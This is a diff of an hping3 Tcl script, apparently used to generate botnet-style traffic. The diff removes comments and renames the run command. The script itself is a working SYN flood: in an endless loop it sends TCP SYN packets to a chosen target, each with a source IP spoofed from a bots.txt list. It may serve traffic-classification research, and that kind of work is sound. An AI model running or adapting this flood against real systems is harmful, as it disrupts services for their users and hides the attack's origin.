@@ -30,7 +30,6 @@ proc random_bot_ip {} {
     return [lindex $bot_ips $idx]
 }
 
-# Function to generate random source port (1024–65535)
 proc random_port {} {
     return [expr {int(rand()*64512) + 1024}]
 }
@@ -38,15 +37,14 @@ proc random_port {} {
 while {1} {
     set saddr [random_bot_ip]
     set sport [random_port]
-    # TCP SYN packet: spoofed source IP from bots.txt
     set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+tcp(sport=$sport,dport=$dst_port,flags=s,win=$window,seq=$seq)"
     hping send $pkt
     incr count
-    # Print every 1000 packets sent
+
     if {[expr {$count % 1000}] == 0} {
         puts "$count packets sent (random spoofed IPs from bots.txt)..."
     }
 }
 
-# To run: sudo hping3 exec custom_random_ip_spoofing.htcl
+# Comando: sudo hping3 exec botnet_Classif_Table.htcl
 # File bots.txt must be in the same directory, with one IP per line
